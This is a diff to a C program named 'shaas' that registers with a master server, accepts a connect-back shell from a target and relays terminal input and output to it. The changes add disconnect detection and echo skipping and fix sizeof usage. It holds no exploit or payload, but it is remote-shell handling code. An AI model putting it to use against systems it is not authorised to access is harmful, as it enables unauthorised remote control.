@@ -11,6 +11,8 @@
 #include <errno.h>
 #include <shaas/config.h>
 
+#define POLLRDHUP 0x2000
+
 static int running;
 
 static void
@@ -19,8 +21,8 @@ sigint_handler(int signo) {
 }
 
 static int
-transfer_data(int from, int to) {
-  int n, chunk_size, rc;
+transfer_data(int from, int to, size_t skip) {
+  int n, r, chunk_size, rc;
   char buf[4096];
 
   rc = ioctl(from, FIONREAD, &n);
@@ -29,32 +31,37 @@ transfer_data(int from, int to) {
     goto fail;
   }
 
-  while (n > 0) {
+  r = 0;
+  while (r < n) {
     chunk_size = n > sizeof(buf) ? sizeof(buf) : n;
     rc = chunk_size = read(from, buf, chunk_size);
     if (rc < 0)
       goto fail;
-    rc = write(to, buf, rc);
-    if (rc < 0)
-      goto fail;
-    n -= chunk_size;
+    if (r >= skip) {
+      rc = write(to, buf, rc);
+      if (rc < 0)
+        goto fail;
+    }
+    r += chunk_size;
   }
 
+  rc = r;
 fail:
   return rc;
 }
 
 int
 main(int argc, char **argv) {
+  unsigned char target_id;
   char success, *invalid_ptr, *master_ip;
   int rc, listen_fd, shell_fd, master_fd;
-  size_t target_id;
   socklen_t target_addr_len;
   struct sockaddr_in listen_addr, master_addr, target_addr;
   struct sigaction sig_alrm, sig_int;
-  struct pollfd pfds[2];
-  char ip_str[INET_ADDRSTRLEN];
   struct in_addr target_ip;
+  struct pollfd pfds[2];
+  size_t last_input_len;
+  char ip_str[INET_ADDRSTRLEN];
 
   if (argc < 3) {
     fputs("Please specify a target IP: ./shaas TARGET_ID CLIENT_IP [MASTER_IP]\n", stderr);
@@ -100,7 +107,7 @@ main(int argc, char **argv) {
   }
 
   rc = 1;
-  rc = setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &rc, sizeof(int));
+  rc = setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &rc, sizeof(rc));
   if (rc < 0) {
     perror("setsockopt");
     goto close_listenfd;
@@ -113,7 +120,7 @@ main(int argc, char **argv) {
   rc = bind(
       listen_fd,
       (struct sockaddr*)&listen_addr,
-      sizeof(struct sockaddr_in));
+      sizeof(listen_addr));
   if (rc < 0) {
     perror("bind");
     goto close_listenfd;
@@ -139,13 +146,13 @@ main(int argc, char **argv) {
   rc = connect(
       master_fd,
       (struct sockaddr*)&master_addr,
-      sizeof(struct sockaddr_in));
+      sizeof(master_addr));
   if (rc < 0) {
     perror("connect");
     goto close_masterfd;
   }
   
-  write(master_fd, &target_id, sizeof(size_t));
+  write(master_fd, &target_id, sizeof(target_id));
   write(master_fd, &target_ip.s_addr, sizeof(in_addr_t));
   write(master_fd, &listen_addr.sin_port, sizeof(in_port_t));
   rc = read(master_fd, &success, 1);
@@ -159,7 +166,7 @@ main(int argc, char **argv) {
   }
   close(master_fd);
 
-  target_addr_len = sizeof(struct sockaddr_in);
+  target_addr_len = sizeof(target_addr);
   alarm(5);
   rc = shell_fd =
       accept(listen_fd, (struct sockaddr*)&target_addr, &target_addr_len);
@@ -179,10 +186,11 @@ main(int argc, char **argv) {
   close(listen_fd);
 
   running = 1;
+  last_input_len = 0;
   pfds[0].fd = 0;
   pfds[0].events = POLLIN;
   pfds[1].fd = shell_fd;
-  pfds[1].events = POLLIN;
+  pfds[1].events = POLLIN | POLLRDHUP;
   while (running) {
     rc = poll(pfds, 2, 1000);
     if (rc == 0)
@@ -193,10 +201,19 @@ main(int argc, char **argv) {
       perror("poll");
       break;
     }
-    if (pfds[0].revents & POLLIN)
-      transfer_data(0, shell_fd);
-    if (pfds[1].revents & POLLIN)
-      transfer_data(shell_fd, 1);
+    if (pfds[1].revents & (POLLERR | POLLRDHUP)) {
+      puts("target disconnected");
+      break;
+    }
+    if (pfds[0].revents & POLLIN) {
+      rc = last_input_len = transfer_data(0, shell_fd, 0);
+      if (rc < 0)
+        last_input_len = 0;
+    }
+    if (pfds[1].revents & POLLIN) {
+      transfer_data(shell_fd, 1, last_input_len);
+      last_input_len = 0;
+    }
   }
 
   close(shell_fd);
